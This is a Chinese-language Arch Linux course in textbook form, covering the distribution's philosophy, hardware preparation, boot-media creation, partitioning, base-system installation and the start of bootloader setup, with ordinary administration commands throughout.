# Arch Linux 系统课程

> 本课程以教科书形式系统讲解 Arch Linux，从基础认知到进阶实战，共 33 讲、11 章。每讲包含「概念—原理—例子—总结」四个标准化部分，循序渐进，注重实用。

---

## 课程总览

- **预计讲数**：33 讲（11 章）
- **学习目标**：
  1. 理解 Arch Linux 的设计哲学与生态定位
  2. 独立完成 Arch Linux 的安装与基础配置
  3. 熟练使用 Pacman 与 AUR 管理软件
  4. 掌握用户权限、网络、图形界面、systemd 等核心子系统
  5. 具备系统维护、故障排查与性能调优能力
  6. 了解 Btrfs 快照、磁盘加密、开发环境等进阶主题
- **适用人群**：有一定 Linux 基础、希望深入理解系统运作原理的用户
- **学习建议**：按章节顺序学习，每讲配合实际操作，遇到问题善用 `man`、`--help` 与 Arch Wiki

---

## 详细章节目录

### 第 1 章：Arch Linux 入门认知
- 第 1 讲：Arch Linux 是什么
- 第 2 讲：Arch 的设计哲学与原则
- 第 3 讲：与主流发行版的对比

### 第 2 章：安装准备
- 第 4 讲：硬件要求与兼容性检查
- 第 5 讲：镜像下载与启动盘制作
- 第 6 讲：分区方案与引导模式规划

### 第 3 章：系统安装实战
- 第 7 讲：进入 Live 环境与联网
- 第 8 讲：磁盘分区与文件系统创建
- 第 9 讲：基础系统安装与配置
- 第 10 讲：引导加载器与首次启动

### 第 4 章：Pacman 包管理
- 第 11 讲：Pacman 基础命令
- 第 12 讲：仓库与镜像源配置
- 第 13 讲：软件包查询与依赖处理

### 第 5 章：AUR 与软件生态
- 第 14 讲：AUR 原理与生态
- 第 15 讲：AUR Helper 使用
- 第 16 讲：PKGBUILD 与自定义包

### 第 6 章：用户与权限管理
- 第 17 讲：用户与组管理
- 第 18 讲：sudo 与权限委派
- 第 19 讲：文件权限与 ACL

### 第 7 章：网络配置
- 第 20 讲：NetworkManager 与网络配置
- 第 21 讲：防火墙配置
- 第 22 讲：SSH 服务与安全加固

### 第 8 章：图形界面
- 第 23 讲：X11、Wayland 与显卡驱动
- 第 24 讲：桌面环境安装
- 第 25 讲：窗口管理器

### 第 9 章：systemd 与系统服务
- 第 26 讲：systemd 基础与服务管理
- 第 27 讲：定时任务与 timer
- 第 28 讲：日志系统 journalctl

### 第 10 章：系统维护与优化
- 第 29 讲：系统更新与备份恢复
- 第 30 讲：性能监控与调优
- 第 31 讲：故障排查与救援

### 第 11 章：进阶主题
- 第 32 讲：Btrfs 与快照回滚
- 第 33 讲：Arch 作为开发环境

---

## 第 1 章：Arch Linux 入门认知

### 第 1 讲：Arch Linux 是什么

#### 概念

Arch Linux 是一款独立开发的、面向 x86-64 架构的通用 Linux 发行版，由加拿大程序员 Judd Vinet 于 2002 年 3 月 11 日首次发布。它的核心定位是"轻量级"（lightweight）和"简洁性"（simplicity），不预装任何多余的软件，整个基础系统仅包含 GNU 核心工具、内核、systemd 以及少量必要的库文件，安装完成后用户面对的是一个纯命令行环境。Arch 采用滚动更新（rolling release）模式，没有所谓的"大版本升级"，只要持续更新，系统永远是最新的。它的包管理器 Pacman 是用 C 语言编写的，专门为 Arch 设计，速度极快。

#### 原理

Arch Linux 之所以能保持"轻量"和"简洁"，源于其设计上的几个关键决策。首先是"零默认"原则：安装程序 `archinstall` 或手动安装流程不会替用户做任何选择，桌面环境、浏览器、办公软件、显示管理器统统不装，由用户根据需要自行添加。其次是"无补丁"策略：Arch 官方仓库中的软件包尽量采用上游原版，不做发行版特有的补丁修改，这意味着软件行为与官方文档完全一致，降低了学习成本。第三是滚动更新机制：Arch 没有"Arch 2023""Arch 2024"这样的版本号概念，所有软件包都从 `core`、`extra`、`multilib` 三个主仓库实时拉取最新稳定版，通过持续的增量更新替代周期性大版本升级。这种模式的好处是永远不需要重装系统，坏处是偶尔需要手动处理破坏性更新。

#### 例子

查看当前系统版本与内核信息：

```bash
# 查看 Arch Linux 安装版本（仅表示安装介质版本，不代表系统版本）
cat /etc/arch-release

# 查看内核版本
uname -r

# 查看系统完整信息
uname -a
```

典型输出示例：

```
Linux myarch 6.8.9-arch1-1 #1 SMP PREEMPT_DYNAMIC Wed, 01 May 2024 21:53:55 +0000 x86_64 GNU/Linux
```

查看当前已安装的软件包数量：

```bash
pacman -Q | wc -l
```

一个刚装好的最小化 Arch 系统通常只有 150-200 个包，而 Ubuntu 桌面版通常有 1500+ 个包，这正是"轻量"的直观体现。

#### 总结

- Arch Linux 是一款轻量、简洁、滚动更新的通用 Linux 发行版
- 核心特征：零默认安装、上游原版软件、滚动更新模式
- 包管理器为 Pacman，专为 Arch 设计
- 安装后是纯命令行环境，一切由用户自行配置
- 适合愿意动手、追求系统掌控权的用户

---

### 第 2 讲：Arch 的设计哲学与原则

#### 概念

Arch Linux 的设计哲学可以浓缩为五个核心原则，它们被官方称为 "Arch Way"：简洁性（Simplicity）、正确性优于便利性（Correctness over convenience）、以用户为中心（User-centric）、开放性（Openness）和自由性（Freedom）。其中"简洁性"是 Arch 最核心的价值观，但它指的不是"对新手友好"或"操作简单"，而是"系统结构清晰、没有冗余"。Arch 认为，一个让用户清楚知道每个组件作用的系统，才是真正简洁的系统。

#### 原理

**简洁性原则**意味着 Arch 不会为了"开箱即用"而预配置大量服务。例如，安装完 `nginx` 后，Arch 不会自动启动它，也不会开机自启，用户必须手动执行 `systemctl start nginx` 和 `systemctl enable nginx`。这种"不替用户做决定"的设计，让用户对系统状态有完全的掌控。

**正确性优于便利性**原则体现在 Arch 不会为了方便而牺牲系统的正确性。例如，当某个软件包升级需要手动干预时，Arch 不会用 hack 方式自动绕过，而是会在更新日志中明确提示用户需要执行什么操作。这避免了"看似正常实则埋雷"的情况。

**以用户为中心**意味着 Arch 假设用户有能力阅读文档、理解命令、做出决策。官方文档 Arch Wiki 是 Linux 世界最优秀的文档之一，几乎所有问题都能在其中找到答案。Arch 不会"保姆式"地引导用户，而是提供详尽资料让用户自主解决。

**开放性和自由性**体现在 Arch 完全开源，社区驱动，不预装非自由软件（除非用户主动添加 `multilib` 等仓库），尊重用户的选择权。

#### 例子

对比 Arch 与 Ubuntu 安装 `nginx` 后的行为差异：

```bash
# Ubuntu：安装后自动启动并设置开机自启
sudo apt install nginx
systemctl status nginx   # 已经在运行

# Arch：安装后什么都不做，需要用户手动启动
sudo pacman -S nginx
systemctl status nginx   # 未运行（inactive）
sudo systemctl start nginx
sudo systemctl enable nginx
```

这种差异正是"以用户为中心"哲学的体现：Arch 认为是否启动服务应该由用户决定，而不是包管理器越俎代庖。

#### 总结

- Arch 五大原则：简洁、正确优于便利、以用户为中心、开放、自由
- "简洁"指系统结构清晰，而非"操作简单"
- 不替用户做决定，所有配置由用户主动完成
- 假设用户有能力阅读文档、理解系统
- Arch Wiki 是最权威的学习资源，遇到问题应首先查阅

---

### 第 3 讲：与主流发行版的对比

#### 概念

要理解 Arch Linux 的定位，需要将它与主流 Linux 发行版进行对比。常见的对比对象包括 Ubuntu/Debian（面向桌面和服务器的新手友好型）、Fedora（Red Hat 系的桌面前沿）、CentOS/RHEL（企业级稳定服务器）以及 Gentoo（极致优化的源码发行版）。Arch 在这些发行版中处于"中等难度、滚动更新、高度可定制"的独特位置。

#### 原理

**与 Ubuntu/Debian 的差异**：Ubuntu 基于 Debian，采用固定的 6 个月发布周期，每两年发布一个 LTS 长期支持版。它预装大量软件，开箱即用，适合新手。Debian 则更强调稳定性，软件版本较旧但经过充分测试。Arch 与之相反，软件版本最新、滚动更新、不预装软件。Debian 用 `apt` 管理包，Arch 用 `pacman`；Debian 的 `.deb` 包格式与 Arch 的 `.pkg.tar.zst` 完全不兼容。

**与 Fedora 的差异**：Fedora 是 Red Hat 的桌面试验田，也是半年一发布，但软件版本比 Debian 新，比 Arch 略旧。Fedora 强调"只使用自由软件"，默认不安装专有驱动和编解码器，需要手动添加 RPM Fusion 仓库。Arch 则更务实，`multilib` 仓库提供 32 位库，专有驱动通过 AUR 即可安装。

**与 Gentoo 的差异**：Gentoo 是源码发行版，所有软件都从源码编译，可以根据 CPU 架构做极致优化，但安装一个系统可能需要数天。Arch 提供预编译的二进制包，安装快速，同时通过 AUR 保留了源码编译的灵活性。

**与 NixOS 的差异**：NixOS 采用声明式配置和函数式包管理，系统状态可完全回滚，但学习曲线陡峭。Arch 则是传统的命令式管理，更直观。

#### 例子

各发行版安装 `htop` 的命令对比：

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install htop

# Fedora
sudo dnf install htop

# Arch Linux
sudo pacman -S htop

# Gentoo（从源码编译）
sudo emerge sys-process/htop

# NixOS（声明式）
# 在 configuration.nix 中添加：environment.systemPackages = [ pkgs.htop ];
# 然后：sudo nixos-rebuild switch
```

各发行版软件版本对比（以 Linux 内核为例，2024 年中数据）：

| 发行版 | 内核版本 | 包管理器 | 发布模式 |
|--------|---------|---------|---------|
| Debian 12 | 6.1 LTS | apt | 固定周期 |
| Ubuntu 24.04 | 6.8 | apt | LTS + 半年 |
| Fedora 40 | 6.8 | dnf | 半年 |
| Arch Linux | 6.9+ | pacman | 滚动 |
| Gentoo | 6.9+ | emerge | 滚动（源码） |

#### 总结

- Arch 与 Ubuntu/Debian：滚动 vs 固定周期，最小化 vs 开箱即用
- Arch 与 Fedora：都较新，但 Arch 更激进，Fedora 更保守
- Arch 与 Gentoo：二进制 vs 源码，快速安装 vs 极致优化
- Arch 与 NixOS：命令式 vs 声明式，直观 vs 可回滚
- Arch 的独特定位：滚动更新 + 二进制包 + 高度可定制 + 优秀文档

---

## 第 2 章：安装准备

### 第 4 讲：硬件要求与兼容性检查

#### 概念

Arch Linux 对硬件的要求非常低：最低 512MB 内存、2GB 磁盘空间即可安装基础系统，x86-64 架构 CPU（不支持 32 位）。但实际使用中，桌面环境通常需要 4GB 以上内存和 20GB 以上磁盘空间。在安装前，需要确认硬件兼容性，尤其是显卡、无线网卡、蓝牙等专有驱动支持的设备。Arch 官方提供了 HCL（Hardware Compatibility List），但更实用的方式是直接用 Live USB 启动测试。

#### 原理

Linux 内核本身包含了大量开源驱动，能识别绝大多数硬件。但有几类硬件需要专有驱动：NVIDIA 显卡（开源 nouveau 驱动性能较差）、部分 Broadcom 无线网卡、部分 Realtek 蓝牙芯片。这些专有驱动在 Arch 中通过 `extra` 仓库或 AUR 提供。在安装前了解硬件型号，可以预先规划驱动安装方案，避免装完系统后无法联网或无法进入图形界面的尴尬。

UEFI 与 Legacy BIOS 的区别也影响安装：2012 年后的主板基本都支持 UEFI，Arch 推荐 UEFI 模式安装，可以使用 GPT 分区表和更大的磁盘。Legacy BIOS 模式则使用 MBR 分区表，最大支持 2TB 磁盘。安装前需要进入 BIOS/UEFI 设置，关闭 Secure Boot（Arch 默认不支持 Secure Boot，需要额外配置才能启用）。

#### 例子

在已安装的 Linux 系统中查看硬件信息：

```bash
# 查看 CPU 信息
lscpu

# 查看内存
free -h

# 查看所有 PCI 设备（包括显卡、网卡）
lspci
lspci -v | grep -A 10 -i vga   # 详细查看显卡

# 查看 USB 设备
lsusb

# 查看磁盘
lsblk
fdisk -l

# 查看无线网卡（确认是否被内核识别）
ip link
lspci | grep -i network
```

典型输出示例（NVIDIA 显卡机器）：

```
$ lspci | grep -i vga
01:00.0 VGA compatible controller: NVIDIA Corporation GA106 [GeForce RTX 3060] (rev a1)
```

看到 NVIDIA 字样，意味着安装后需要安装 `nvidia` 专有驱动包。

查看是否为 UEFI 系统：

```bash
# 如果该目录存在且有内容，说明是 UEFI 模式
ls /sys/firmware/efi/efivars
```

#### 总结

- Arch 最低要求：512MB 内存、2GB 磁盘、x86-64 CPU
- 桌面使用建议：4GB+ 内存、20GB+ 磁盘
- 重点关注的硬件：显卡（NVIDIA/AMD）、无线网卡、蓝牙
- 安装前关闭 Secure Boot
- 推荐使用 UEFI 模式安装
- 用 Live USB 启动测试是最直接的兼容性检查方式

---

### 第 5 讲：镜像下载与启动盘制作

#### 概念

Arch Linux 的安装镜像是一个约 1GB 的 ISO 文件，包含了 Live 环境和安装工具。镜像从官方镜像站下载，建议选择地理位置最近的镜像以获得最佳速度。启动盘制作需要将 ISO 写入 U 盘，注意是"写入"而非"复制"——直接复制 ISO 文件到 U 盘是无法启动的。制作工具在 Linux 下用 `dd` 或 `cp`，在 Windows 下用 Rufus 或 Ventoy，在 macOS 下用 `dd`。

#### 原理

ISO 文件是一种光盘镜像格式，包含了完整的文件系统和引导信息。制作启动盘的本质是将 ISO 的内容（包括引导扇区）原样写入 U 盘的整个块设备，而不是写入某个分区。这就是为什么用 `dd` 时目标设备是 `/dev/sdb`（整个磁盘）而非 `/dev/sdb1`（分区）。

`dd` 命令的工作原理是按块（block）复制数据，`bs=4M` 设置块大小为 4MB，`status=progress` 显示进度。`oflag=sync` 确保数据真正写入磁盘而非仅写入缓存，避免拔出 U 盘时数据不完整。

Arch 镜像采用混合镜像（hybrid image）格式，可以同时用于光盘刻录和 U 盘写入，无需额外转换。这也是为什么在 Linux 下可以直接用 `cp archlinux.iso /dev/sdb` 来制作启动盘——内核会识别 ISO 的混合格式并正确写入引导扇区。

#### 例子

**下载镜像**（访问 https://archlinux.org/download/ 选择镜像）：

```bash
# 使用国内镜像站下载（清华源）
wget https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/archlinux-x86_64.iso

# 校验签名（确保镜像完整未被篡改）
wget https://archlinux.org/iso/latest/archlinux-x86_64.iso.sig
gpg --keyserver-options auto-key-retrieve --verify archlinux-x86_64.iso.sig
```

**Linux 下制作启动盘**：

```bash
# 1. 查看 U 盘设备名（插入 U 盘前后各执行一次，多出来的就是 U 盘）
lsblk

# 2. 卸载 U 盘（如果已自动挂载）
sudo umount /dev/sdX*

# 3. 写入镜像（注意 sdX 替换为实际设备名，千万别选错！）
sudo dd if=archlinux-x86_64.iso of=/dev/sdX bs=4M status=progress oflag=sync

# 或者用 cp（更简单）
sudo cp archlinux-x86_64.iso /dev/sdX && sync
```

**Windows 下制作**：

- 推荐使用 Rufus：选择 ISO 模式写入
- 或使用 Ventoy：将 Ventoy 安装到 U 盘后，直接把 ISO 文件复制到 U 盘即可多系统启动

**macOS 下制作**：

```bash
# 将 ISO 转换为 DMG（可选）
hdiutil convert -format UDRW -o archlinux.dmg archlinux.iso

# 查找 U 盘设备
diskutil list

# 卸载 U 盘
diskutil unmountDisk /dev/diskN

# 写入
sudo dd if=archlinux.dmg of=/dev/rdiskN bs=4m
```

#### 总结

- 镜像从官方镜像站下载，建议选国内镜像站提速
- 下载后务必校验 GPG 签名，防止镜像被篡改
- Linux 下用 `dd` 或 `cp` 写入整个块设备（不是分区）
- Windows 下推荐 Rufus 或 Ventoy
- `dd` 命令危险，务必确认 `of=` 指向正确的 U 盘设备
- 写入后用 `sync` 确保数据落盘

---

### 第 6 讲：分区方案与引导模式规划

#### 概念

在安装 Arch 前，需要规划好分区方案。分区方案决定了系统的磁盘使用方式、是否支持快照、能否多系统共存等。常见的分区方案有三种：传统分区（/、/home、swap）、LVM 分区（逻辑卷管理，灵活调整大小）、Btrfs 子卷分区（支持快照和压缩）。引导模式分为 UEFI 和 Legacy BIOS 两种，UEFI 模式需要额外的 EFI 系统分区（ESP），这是安装前必须明确的第一个决策。

#### 原理

**UEFI 与 Legacy BIOS 的分区差异**：

UEFI 模式下，必须有一个 FAT32 格式的 EFI 系统分区（ESP），大小通常 300MB-1GB，挂载到 `/boot` 或 `/boot/efi`。引导加载器（如 GRUB、systemd-boot）的 EFI 程序存放在这里，UEFI 固件通过读取 ESP 中的 `.efi` 文件来引导系统。

Legacy BIOS 模式下，不需要 ESP，但需要磁盘第一个扇区有引导记录（MBR）。GRUB 会安装到 MBR 和 `/boot` 分区。

**分区方案选择**：

1. **简单方案**：`/`（根分区，ext4，30GB+）、`/home`（用户数据，ext4，剩余空间）、`swap`（交换分区，内存大小或 2 倍）。适合新手，稳定可靠。

2. **LVM 方案**：在物理分区上创建 LVM 卷组，再划分逻辑卷。优点是可以动态调整分区大小，缺点是配置复杂。

3. **Btrfs 方案**：整个磁盘一个 Btrfs 分区，通过子卷（subvolume）模拟分区。优点是支持快照、压缩、去重，缺点是对 SSD 友好但对 HDD 性能一般。

4. **Btrfs + LVM 混合**：少数高级用户使用。

**Swap 的选择**：现代系统如果内存充足（16GB+），可以不用 swap 分区，改用 swap 文件（更灵活）。Btrfs 上创建 swap 文件需要特殊配置。

#### 例子

**UEFI + 简单分区方案示例**（500GB SSD，16GB 内存）：

| 分区 | 大小 | 类型 | 文件系统 | 挂载点 |
|------|------|------|---------|--------|
| /dev/sda1 | 1GB | EFI System | FAT32 | /boot/efi |
| /dev/sda2 | 32GB | Linux root | ext4 | / |
| /dev/sda3 | 16GB | Linux swap | swap | [SWAP] |
| /dev/sda4 | 451GB | Linux home | ext4 | /home |

**UEFI + Btrfs 方案示例**（500GB SSD）：

| 分区 | 大小 | 类型 | 文件系统 | 挂载点 |
|------|------|------|---------|--------|
| /dev/sda1 | 1GB | EFI System | FAT32 | /boot/efi |
| /dev/sda2 | 499GB | Linux filesystem | btrfs | / |

Btrfs 子卷规划：
```
@         -> /        (根子卷)
@home     -> /home    (用户数据)
@snapshots -> /.snapshots (快照)
@var      -> /var     (可变数据)
```

**规划检查清单**：

```bash
# 确认引导模式（在 Live 环境中）
ls /sys/firmware/efi/efivars  # 存在则 UEFI，不存在则 Legacy

# 确认磁盘
lsblk
fdisk -l

# 确认是否需要保留其他系统
# 如果是双系统，需要预留 Windows 分区不动
```

#### 总结

- 安装前必须明确：UEFI 还是 Legacy BIOS 模式
- UEFI 需要 ESP 分区（FAT32，300MB-1GB）
- 三种主流分区方案：简单 ext4、LVM、Btrfs 子卷
- Btrfs 方案支持快照和压缩，是现代推荐方案
- Swap 可用分区或文件，内存充足时文件更灵活
- 双系统安装需特别注意不要破坏已有分区

---

## 第 3 章：系统安装实战

### 第 7 讲：进入 Live 环境与联网

#### 概念

将制作好的 Arch 启动盘插入电脑，从 U 盘启动后，会进入 Arch 的 Live 环境。这是一个基于 RAM 的临时系统，包含完整的命令行工具集和安装脚本。Live 环境以 root 用户登录，无需密码。进入 Live 环境后的第一件事是联网——因为 Arch 的安装过程需要从网络下载软件包。联网方式分有线（自动 DHCP）和无线（需要手动配置）两种。

#### 原理

Arch Live 环境基于 SquashFS 文件系统，整个系统加载到内存中运行，关机后所有更改丢失。Live 环境内置了 `NetworkManager`、`systemd-networkd`、`wpa_supplicant` 等网络工具，以及 `iwctl`（Intel 的无线网络管理工具）。

有线网络通常通过 DHCP 自动获取 IP，无需配置。无线网络需要先扫描 SSID，再连接并认证。Arch Live 默认启动了 `systemd-networkd` 服务，但无线连接更推荐用 `iwctl`（iwd 的命令行界面）。

网络连通后，需要更新系统时钟，因为 HTTPS 证书验证和包签名验证都依赖正确的时间。`timedatectl` 命令用于设置时区和同步 NTP 时间。

#### 例子

**进入 Live 环境后的基本操作**：

```bash
# 确认引导模式（UEFI 还是 BIOS）
ls /sys/firmware/efi/efivars  # 有输出则 UEFI

# 查看键盘布局（默认 US）
ls /usr/share/kbd/keymaps/**/*.map.gz

# 设置键盘布局（如需要中文键盘，但通常 US 即可）
loadkeys us

# 设置字体（如果终端字体太小）
setfont ter-132n
```

**有线网络连接**（通常自动）：

```bash
# 查看网络接口
ip link

# 启用接口
ip link set eth0 up

# 通过 DHCP 获取 IP（通常已自动）
dhcpcd eth0

# 测试连通性
ping -c 3 archlinux.org
```

**无线网络连接**（使用 iwctl）：

```bash
# 进入交互式界面
iwctl

# 在 iwctl 中：
[iwd]# device list                    # 查看无线设备
[iwd]# adapter phy0 set-property powered on
[iwd]# device wlan0 set-property powered on
[iwd]# station wlan0 scan             # 扫描网络
[iwd]# station wlan0 get-networks     # 列出可用网络
[iwd]# station wlan0 connect "MyWiFi" # 连接网络（会提示输入密码）
[iwd]# quit

# 测试连通性
ping -c 3 archlinux.org
```

**更新系统时钟**：

```bash
# 查看 NTP 状态
timedatectl status

# 启用 NTP 同步
timedatectl set-ntp true

# 设置时区（中国）
timedatectl set-timezone Asia/Shanghai

# 验证时间
date
```

**配置镜像源**（加速下载）：

```bash
# 使用 reflector 自动选择最快的镜像
pacman -S reflector
reflector --country China --age 12 --protocol https --sort rate --save /etc/pacman.d/mirrorlist

# 或者手动编辑镜像列表
vim /etc/pacman.d/mirrorlist
# 将中国镜像放到列表顶部：
# Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch
# Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch
```

#### 总结

- Live 环境是 RAM 中的临时系统，关机即丢失
- 有线网络通常自动 DHCP，无线用 `iwctl` 连接
- 联网后必须 `timedatectl set-ntp true` 同步时间
- 用 `reflector` 或手动配置镜像源加速下载
- 安装前务必 `ping archlinux.org` 确认网络通畅
- 默认以 root 登录，无需密码

---

### 第 8 讲：磁盘分区与文件系统创建

#### 概念

磁盘分区是将物理磁盘划分为多个逻辑部分的过程，每个部分可以独立格式化和挂载。Arch 推荐使用 `cfdisk`（菜单式）或 `fdisk`（命令式）进行分区。分区完成后，需要在每个分区上创建文件系统（如 ext4、btrfs、FAT32）。文件系统决定了数据如何存储和检索。本讲以 UEFI + Btrfs 方案为例，演示完整的分区和格式化流程。

#### 原理

**分区表类型**：GPT（GUID Partition Table）是 UEFI 时代的标准，支持 128 个主分区，最大磁盘 8ZB。MBR（Master Boot Record）是 Legacy BIOS 时代的标准，最多 4 个主分区，最大磁盘 2TB。UEFI 模式必须用 GPT，Legacy BIOS 模式通常用 MBR（也可用 GPT 但需要 BIOS Boot Partition）。

**文件系统选择**：
- **ext4**：最稳定的 Linux 文件系统，性能良好，无快照功能。适合新手和追求稳定性的用户。
- **btrfs**：现代文件系统，支持快照、压缩、子卷、去重。CoW（Copy-on-Write）机制让快照几乎不占空间。适合愿意学习的用户。
- **xfs**：高性能，适合大文件场景，但不支持缩减。
- **f2fs**：为闪存优化，适合 SSD 和 eMMC。

**EFI 系统分区（ESP）**：必须是 FAT32 格式，因为 UEFI 固件只能识别 FAT 系列。大小至少 100MB，推荐 300MB-1GB（多系统共存时建议更大）。

**Btrfs 子卷**：Btrfs 不需要传统分区，而是用子卷模拟。子卷共享底层存储空间，可以独立快照和挂载。常见做法是创建 `@`（根）、`@home`（用户数据）、`@snapshots`（快照）等子卷。

#### 例子

**使用 cfdisk 分区**（假设磁盘为 /dev/sda，全新磁盘）：

```bash
# 查看磁盘
lsblk

# 启动 cfdisk
cfdisk /dev/sda

# 选择分区表类型：gpt（UEFI 模式）

# 在交互界面中创建分区：
# 1. Free space -> New -> 1G -> Type: EFI System        -> /dev/sda1
# 2. Free space -> New -> 499G -> Type: Linux filesystem -> /dev/sda2
# 3. Write -> 输入 yes -> Quit
```

**使用 fdisk 分区**（命令式）：

```bash
fdisk /dev/sda

# 在 fdisk 中：
# g    # 创建新的 GPT 分区表
# n    # 新分区
# 1    # 分区号 1
#      # 起始扇区（默认）
# +1G  # 大小 1GB
# t    # 修改类型
# 1    # 选择 EFI System
# n    # 新分区
# 2    # 分区号 2
#      # 起始扇区（默认）
#      # 剩余全部空间
# w    # 写入并退出
```

**格式化分区**：

```bash
# 格式化 ESP 为 FAT32
mkfs.fat -F 32 /dev/sda1

# 格式化根分区为 Btrfs
mkfs.btrfs -f /dev/sda2

# 或者格式化为 ext4
mkfs.ext4 /dev/sda2
```

**创建 Btrfs 子卷并挂载**：

```bash
# 挂载根分区到 /mnt
mount /dev/sda2 /mnt

# 创建子卷
btrfs subvolume create /mnt/@
btrfs subvolume create /mnt/@home
btrfs subvolume create /mnt/@snapshots

# 卸载
umount /mnt

# 挂载根子卷（带压缩选项）
mount -o compress=zstd,subvol=@ /dev/sda2 /mnt

# 创建挂载点并挂载其他子卷
mkdir -p /mnt/{home,.snapshots,boot/efi}
mount -o compress=zstd,subvol=@home /dev/sda2 /mnt/home
mount -o compress=zstd,subvol=@snapshots /dev/sda2 /mnt/.snapshots

# 挂载 ESP
mount /dev/sda1 /mnt/boot/efi
```

**验证挂载**：

```bash
lsblk -f
# 应该看到：
# sda1 vfat /mnt/boot/efi
# sda2 btrfs /mnt (subvol=@)
#       btrfs /mnt/home (subvol=@home)
#       btrfs /mnt/.snapshots (subvol=@snapshots)
```

#### 总结

- UEFI 模式必须用 GPT 分区表
- ESP 必须是 FAT32，至少 100MB
- Btrfs 推荐用子卷模拟分区，支持快照和压缩
- 挂载顺序：先根子卷，再其他子卷，最后 ESP
- Btrfs 挂载选项 `compress=zstd` 启用透明压缩，节省空间
- 用 `lsblk -f` 验证挂载结果

---

### 第 9 讲：基础系统安装与配置

#### 概念

基础系统安装使用 `pacstrap` 脚本，它会调用 `pacman` 将基础包组（base、linux、linux-firmware）安装到 `/mnt`。安装完成后，需要生成 `fstab`（文件系统表），然后 `arch-chroot` 进入新系统进行配置：设置时区、本地化、主机名、root 密码、创建普通用户等。这一讲是整个安装过程的核心。

#### 原理

**pacstrap 的工作原理**：`pacstrap /mnt base linux linux-firmware` 实际上是用 `pacman --root /mnt --cachedir /mnt/var/cache/pacman/pkg` 安装指定包。它会将包解压到 `/mnt`，并执行安装脚本。`base` 包组包含最小化系统所需的工具（bash、coreutils、systemd、pacman 等），`linux` 是内核，`linux-firmware` 是固件集合。

**fstab 的作用**：`/etc/fstab` 是文件系统表，记录了哪些分区应该挂载到哪里、用什么文件系统、什么挂载选项。系统启动时 `systemd-fstab-generator` 读取该文件，自动生成挂载单元。`genfstab -U /mnt >> /mnt/etc/fstab` 命令根据当前挂载状态生成 fstab，`-U` 表示用 UUID（而非设备名）标识分区，更稳定（设备名可能变化，UUID 不变）。

**arch-chroot 的原理**：`chroot` 是改变根目录的操作，`arch-chroot` 是 Arch 封装的增强版，会自动挂载 `/proc`、`/sys`、`/dev` 等虚拟文件系统到新根目录，让用户能在新系统中执行命令。

**本地化（locale）**：Linux 系统通过 locale 设置语言、字符集、日期格式等。`/etc/locale.gen` 列出所有可用 locale，取消注释后执行 `locale-gen` 生成。`/etc/locale.conf` 设置系统默认 locale。中文用户通常设置 `LANG=zh_CN.UTF-8`，但建议同时保留 `LANG=en_US.UTF-8` 作为终端默认（避免 TTY 乱码）。

#### 例子

**安装基础系统**：

```bash
# 安装基础包（base、linux、linux-firmware）+ 常用工具
pacstrap /mnt base linux linux-firmware base-devel

# 同时安装一些必备工具（推荐）
pacstrap /mnt nano vim sudo networkmanager btrfs-progs

# 如果是 Intel CPU，安装微码
pacstrap /mnt intel-ucode
# 如果是 AMD CPU
pacstrap /mnt amd-ucode
```

**生成 fstab**：

```bash
genfstab -U /mnt >> /mnt/etc/fstab

# 验证
cat /mnt/etc/fstab
# 应该看到类似：
# UUID=xxxx-xxxx /boot/efi vfat defaults 0 2
# UUID=yyyy-yyyy / btrfs rw,relatime,compress=zstd:3,subvol=@ 0 0
```

**chroot 进入新系统**：

```bash
arch-chroot /mnt
# 此时提示符变化，表示已进入新系统
```

**配置时区**：

```bash
# 设置时区
ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime

# 同步硬件时钟到系统时钟
hwclock --systohc
```

**配置本地化**：

```bash
# 编辑 locale.gen，取消注释需要的 locale
nano /etc/locale.gen
# 取消注释以下行：
# en_US.UTF-8 UTF-8
# zh_CN.UTF-8 UTF-8

# 生成 locale
locale-gen

# 设置默认 locale（建议英文，避免 TTY 乱码）
echo "LANG=en_US.UTF-8" > /etc/locale.conf
```

**配置主机名和网络**：

```bash
# 设置主机名
echo "myarch" > /etc/hostname

# 配置 hosts 文件
nano /etc/hosts
# 添加：
# 127.0.0.1   localhost
# ::1         localhost
# 127.0.1.1   myarch.localdomain myarch

# 启用 NetworkManager（开机自启）
systemctl enable NetworkManager
```

**设置 root 密码并创建普通用户**：

```bash
# 设置 root 密码
passwd

# 创建普通用户（加入 wheel 组以便使用 sudo）
useradd -m -G wheel -s /bin/bash yourusername

# 设置用户密码
passwd yourusername

# 配置 sudo（取消 wheel 组的 sudo 权限注释）
EDITOR=nano visudo
# 找到 # %wheel ALL=(ALL:ALL) ALL，取消注释
```

#### 总结

- `pacstrap` 安装基础系统，建议同时装 base-devel、nano、sudo、networkmanager
- `genfstab -U` 用 UUID 生成 fstab，比设备名更稳定
- `arch-chroot` 进入新系统进行配置
- 时区用 `ln -sf` 软链接，`hwclock --systohc` 同步硬件时钟
- locale 建议设为 `en_US.UTF-8`，避免 TTY 中文乱码
- 创建普通用户加入 `wheel` 组，配置 sudo 权限
- Intel/AMD CPU 需要安装对应的微码包

---

### 第 10 讲：引导加载器与首次启动

#### 概念

引导加载器（Bootloader）是系统启动时运行的第一个软件，负责加载 Linux 内核到内存并启动系统。Arch 支持多种引导加载器：GRUB（功能最全，支持多系统）、systemd-boot（简洁，UEFI 原生）、rEFInd（图形界面，美观）、LILO（已过时）。本讲以 systemd-boot 和 GRUB 为例，演示引导加载器的安装与配置。安装完成后即可重启进入新系统。

#### 原理

**UEFI 启动流程**：开机 → UEFI 固件初始化 → 读取 NVRAM 中的启动项 → 加载 ESP 中的 `.efi` 文件 → 引导加载器启动 → 加载 Linux 内核 → systemd 启动 → 进入登录界面。

**systemd-boot 的工作原理**：systemd-boot 是 systemd 自带的引导加载器，仅支持 UEFI。它通过 `bootctl install` 将自身安装到 ESP，自动创建启动项。配置文件位于 `/boot/loader/loader.conf`（主配置）和 `/boot/loader/entries/*.conf`（每个内核一个入口）。优点是简洁、与 systemd 集成、配置直观；缺点是不支持 Legacy BIOS、不支持图形界面。

**GRUB 的工作原理**：GRUB 是最通用的引导加载器，支持 UEFI 和 Legacy BIOS，支持多系统启动。UEFI 模式下，`grub-install` 将 GRUB 的 EFI 程序安装到 ESP，并通过 `efibootmgr` 注册启动项。配置文件 `/boot/grub/grub.cfg` 由 `grub-mkconfig` 根据模板和已安装内核自动生成。优点是功能全面；缺点是配置复杂。

